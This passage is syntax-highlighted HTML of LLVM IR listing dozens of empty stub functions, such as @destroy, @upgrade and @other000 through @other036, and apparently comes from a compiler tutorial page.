class="keyword">store</span> <span class="type">i32</span> <span class="variable">%1</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%4</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@destroy</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@upgrade</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@wuxiangdeyidao</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@zhanjinniuza</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@guobapenhuo</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@tiandongwanxiang</span>() <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other000</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other001</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other002</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other003</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other004</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other005</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other006</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other007</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other008</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other009</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other010</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other011</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other012</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other013</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other014</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other015</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other016</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other017</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other018</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other019</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other020</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other021</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other022</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other023</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other024</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other025</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other026</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other027</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other028</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other029</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other030</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other031</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other032</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other033</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other034</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other035</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other036</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span 